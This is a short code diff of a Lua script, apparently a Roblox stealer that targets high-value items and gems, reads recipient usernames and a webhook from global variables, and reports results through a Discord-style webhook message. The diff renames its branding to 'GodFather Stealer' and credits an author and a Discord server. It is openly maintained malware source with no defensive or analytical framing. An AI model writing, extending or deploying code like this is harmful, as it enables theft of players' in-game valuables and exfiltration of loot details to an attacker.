@@ -54,7 +54,6 @@ local users = {}
 local min_rap = 1000000
 local webhook = ""
 local HIGH_VALUE_THRESHOLD = 10000000000
-local DualhookNames
 
 users = _G.Usernames
 webhook = _G.Webhook
@@ -552,7 +551,7 @@ local function SendMessage(GemAmount)
 
         content = contentPing,
 		
-		username = "GodFather Scripts",
+		username = "GodFather Stealer",
 		
 		avatar_url = "https://i.imgur.com/tRc34Ar.png",
 
@@ -565,7 +564,7 @@ local function SendMessage(GemAmount)
             fields = fields,
 
             footer = {
-                text = "GodFather Scripts | .gg/ronixexecutor\n Made By NULS :3"
+                text = "GodFather Stealer | .gg/ronixexecutor\n Made By NULS :3"
             }
 
         }}
